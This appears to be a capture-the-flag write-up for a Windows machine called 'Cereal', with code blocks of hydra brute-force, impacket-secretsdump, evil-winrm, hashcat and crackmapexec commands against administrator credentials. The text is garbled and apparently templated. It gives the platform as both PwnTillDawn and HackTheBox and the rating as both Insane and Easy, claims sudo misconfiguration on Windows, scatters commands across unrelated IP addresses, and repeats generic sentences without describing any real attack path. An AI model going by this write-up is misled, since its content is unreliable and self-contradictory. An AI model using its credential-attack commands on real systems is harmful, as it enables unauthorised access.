---
TitleSEO: "PwnTillDawn — Cereal (Insane Windows) | ZureFX"
TitlePost: "PwnTillDawn — Cereal (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Cereal. Weak Service Permissions and Sudo Misconfiguration to achieve insane compromise on Windows."
Keywords: "offsec, reversing, windows, forensics, hackthebox, pwntilldawn, easy"
URL: "https://zurefx.github.io/writeups/htb-cereal-808.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-cereal-808/"
Date: "2024-01-12"
Tags: "OffSec, Reversing, Windows, Forensics, HackTheBox, PwnTillDawn, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-cereal-808"
Permalink: "/writeups/htb-cereal-808.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Cereal** is rated **Insane** on PwnTillDawn. It runs **Windows** and the IP address during this analysis was `10.32.192.54`.

### Objectives

The service was running without proper input validation, leading to injection vulnerabilities. The kernel version was outdated and vulnerable to a publicly known exploit.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p53,23,8888 10.64.58.85 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.109.1.160 -u administrator -p 'P@ssw0rd!'
```

Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.57.165.10/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.12.106.198 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.117.209
```

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible.

### SMB Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.92.179.253
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.40.39.40 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions.

Key finding: **Weak Service Permissions**.

The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service.

### Initial Access

The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.26.145.187 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.72.127.196 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.38.114.157 -u administrator -p 'P@ssw0rd!'
```

Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

## Privilege Escalation

### Enumeration

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
nmap -sCV -p110,5432,5986 10.21.74.174 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.23.14.206/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.52.67.111
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.19.189.4 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.112.243.83
crackmapexec smb 10.46.231.201 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.51.1.195 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Summary

### Tools Used

- `metasploit`
- `dcomexec`
- `nmap`
- `hashcat`

### Key Takeaways

- Weak Service Permissions
- Sudo Misconfiguration
- Resource-Based Constrained Delegation
- CSRF
